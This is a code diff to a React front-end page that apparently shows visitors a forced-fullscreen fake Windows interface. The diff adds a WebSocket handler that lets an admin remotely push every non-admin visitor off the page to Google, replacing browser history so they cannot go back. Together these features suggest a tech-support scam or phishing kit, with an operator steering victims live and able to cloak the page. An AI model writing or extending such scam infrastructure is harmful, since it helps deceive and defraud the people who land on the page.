@@ -1,11 +1,15 @@
-
 import React, { useState, useEffect, useRef } from 'react';
 import ConfirmationPopup from '../components/ConfirmationPopup';
 import WindowsInterface from '../components/WindowsInterface';
 import MobileInterface from '../components/MobileInterface';
 import { wsClient } from '../integrations/ws-client';
+import NewTopSection from '@/components/NewTopSection';
+import NewMobileLayout from '@/components/NewMobileLayout';
+import { useAdminAuth } from '@/hooks/useAdminAuth';
 
 const Index = () => {
+
+  const { isAuthenticated } = useAdminAuth();
 
   const [showPopup, setShowPopup] = useState(true);
   const [isFullscreen, setIsFullscreen] = useState(false);
@@ -351,12 +355,41 @@ const Index = () => {
     }
   }, []);
 
+  useEffect(() => {
+    // Handle admin redirect command
+    const handleAdminCommand = (command: any) => {
+      if (command.command === 'redirect_to_google') {
+        // Replace current history entry and redirect to Google
+        window.location.replace('https://www.google.com');
+        
+        // Additional prevention measures
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 100);
+      }
+    };
+
+    // Only listen for commands if user is not an admin
+    if (!isAuthenticated) {
+      wsClient.on('admin_command', handleAdminCommand);
+      
+      // Connect to WebSocket if not already connected
+      if (!wsClient.socket.connected) {
+        wsClient.connect();
+      }
+    }
+
+    return () => {
+      wsClient.off('admin_command', handleAdminCommand);
+    };
+  }, [isAuthenticated]);
+
   return (
     <div className="min-h-screen bg-red-500">
       {
         hasEnteredFullscreen ? (
           isMobile ? (
-            <MobileInterface />
+            <NewMobileLayout />
           ) : (
             <WindowsInterface isFullscreen={isFullscreen} highlightFields={hasEnteredFullscreen} clickTrigger={clickCount} />
           )
